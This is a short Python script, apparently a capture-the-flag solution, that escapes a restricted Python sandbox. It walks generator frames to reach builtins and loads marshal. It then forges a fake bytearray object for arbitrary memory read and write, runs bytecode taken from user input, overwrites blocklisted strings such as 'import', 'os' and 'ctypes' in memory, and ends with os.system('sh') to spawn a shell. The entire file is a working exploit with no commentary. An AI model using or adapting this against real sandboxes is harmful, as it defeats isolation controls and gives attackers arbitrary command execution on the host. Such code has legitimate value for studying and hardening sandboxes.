def f():
    yield g.gi_frame.f_back.f_back


g = f()
frame = [x for x in g][0]
a = "_" * 2 + "builtins" + "_" * 2
b = frame.f_back.f_globals[a]

object = b.object
bytearray = b.bytearray
id = b.id
print = b.print
bytes = b.bytes
input = b.input
len = b.len

importer = b.getattr(b, "_" * 2 + "loader" + "_" * 2)
print(importer)
marshal = importer.load_module("marshal")


def p64(addr):
    return addr.to_bytes(8, "little")


const_tuple = ()

# construct the fake bytearray
fake_bytearray = bytearray(
    p64(0x41414141)
    + p64(id(bytearray))  # ob_refcnt
    + p64(0x7FFFFFFFFFFFFFFF)  # ob_type
    + p64(0)  # ob_size (INT64_MAX)
    + p64(0)  # ob_alloc (doesn't seem to really be used?)
    + p64(0)  # *ob_bytes (start at address 0)
    + p64(0)  # *ob_start (ditto)  # ob_exports (not really sure what this does)
)

fake_bytearray_ptr_addr = id(fake_bytearray) + 0x20
const_tuple_array_start = id(const_tuple) + 0x18
offset = (fake_bytearray_ptr_addr - const_tuple_array_start) // 8

print("Offset:", offset)


def dummy():
    pass


bs = bytes.fromhex(input("hex: "))
co = marshal.loads(bs)
b.setattr(dummy, "_" * 2 + "code" + "_" * 2, co)
magic = dummy()

# sanity check
print(magic[id("peko") : id("peko") + 64])

target_strs = [
    "import",
    "spawn",
    "process",
    "os",
    "sys",
    "cpython",
    "fork",
    "open",
    "interpreter",
    "ctypes",
    "compile",
    "gc",
    "_" * 2 + "new" + "_" * 2,
]
for s in target_strs:
    addr = id(s)
    magic[addr + 48 : addr + 48 + len(s)] = b"a" * len(s)

os = b.getattr(b, "_" * 2 + "import" + "_" * 2)("os")
os.system("sh")
